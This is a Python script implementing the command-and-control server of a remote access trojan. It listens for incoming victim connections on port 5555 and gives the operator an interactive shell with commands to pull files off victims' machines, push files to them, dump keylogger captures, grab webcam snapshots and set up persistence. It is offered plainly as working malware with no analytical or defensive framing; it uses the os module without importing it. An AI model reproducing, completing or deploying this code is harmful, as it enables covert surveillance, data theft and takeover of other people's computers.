import socket
import threading

HOST = '0.0.0.0'
PORT = 5555

clients = []

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    while True:
        try:
            cmd = input(f"Shell@{addr}> ")
            if cmd.strip() == '':
                continue
            if cmd.startswith('download '):
                conn.send(cmd.encode())
                filename = cmd.split(' ', 1)[1]
                with open(f"downloaded_{os.path.basename(filename)}", 'wb') as f:
                    while True:
                        data = conn.recv(4096)
                        if data == b'__END__':
                            break
                        f.write(data)
                print(f"[+] File {filename} downloaded.")
            elif cmd.startswith('upload '):
                conn.send(cmd.encode())
                filename = cmd.split(' ', 1)[1]
                try:
                    with open(filename, 'rb') as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk:
                                break
                            conn.send(chunk)
                    conn.send(b'__END__')
                    print(f"[+] File {filename} uploaded.")
                except Exception as e:
                    print(f"[-] Upload error: {e}")
            elif cmd == 'keylog_dump':
                conn.send(cmd.encode())
                data = conn.recv(4096)
                print(f"[Keylogger Dump]\n{data.decode(errors='ignore')}")
            elif cmd == 'webcam_snap':
                conn.send(cmd.encode())
                print("[+] Receiving webcam image...")
                img_data = b''
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    img_data += chunk
                    if len(chunk) < 4096:
                        break
                img_file = f"webcam_{addr[0]}.jpg"
                with open(img_file, 'wb') as f:
                    f.write(img_data)
                print(f"[+] Webcam image saved as {img_file}")
            elif cmd == 'persist':
                conn.send(cmd.encode())
                data = conn.recv(4096)
                print(f"[Persistence] {data.decode(errors='ignore')}")
            else:
                conn.send(cmd.encode())
                data = conn.recv(4096)
                print(data.decode(errors='ignore'))
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    conn.close()

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.start()
        clients.append(conn)

if __name__ == "__main__":
    start_server()
